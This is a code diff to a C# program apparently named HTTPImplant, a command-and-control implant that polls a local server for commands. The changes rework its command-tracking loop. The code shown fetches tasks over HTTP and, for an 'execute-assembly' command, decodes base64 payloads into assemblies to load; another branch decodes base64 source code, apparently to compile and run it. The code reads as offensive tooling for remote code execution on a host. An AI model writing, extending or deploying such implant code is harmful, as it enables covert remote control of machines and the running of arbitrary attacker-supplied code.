@@ -35,6 +35,7 @@ namespace HTTPImplant
                     {
                         string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://127.0.0.1:8081/getCommand"));
                         Console.WriteLine("Getting instructions...");
+
                         Command command = new Command();
                         command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                         command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"Args" }, StringSplitOptions.None)[1];
@@ -46,15 +47,20 @@ namespace HTTPImplant
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"nullterm" }, StringSplitOptions.None)[1];
                         command.NullTerm = jsonResponse.Split(new string[] { "\"nullterm\":\"", "\"}" }, StringSplitOptions.None)[1];
 
-                        Console.WriteLine($"Input: {command.Input}, Command: {command.command}");
+
+                        // Check if lastCommandExecuted is empty
+                        if (string.IsNullOrEmpty(lastCommandExecuted))
+                        {
+                            lastCommandExecuted = command.Input;
+                            continue; // Restart the loop
+                        }
 
                         await Task.Delay(5000);
 
-                        if (command.command != lastCommandExecuted) {
-                            lastCommandExecuted = command.command;
-                        }
+                        // Update lastCommandExecuted
+                        lastCommandExecuted = command.Input;
 
-                        else if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
+                        if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
                         {
                             Console.WriteLine("Running assembly");
                             byte[] bytes = Convert.FromBase64String(command.File);
@@ -74,13 +80,11 @@ namespace HTTPImplant
                         {
                             try
                             {
-                                // Split the information in command.File
                                 string[] parts = command.File.Split(new[] { "  " }, StringSplitOptions.None);
                                 string encodedSourceCode = parts[0];
                                 string className = parts[1];
                                 string methodName = parts[2];
 
-                                // Decode the source code
                                 byte[] data = Convert.FromBase64String(encodedSourceCode);
                                 string decodedSourceCode = Encoding.UTF8.GetString(data);
 
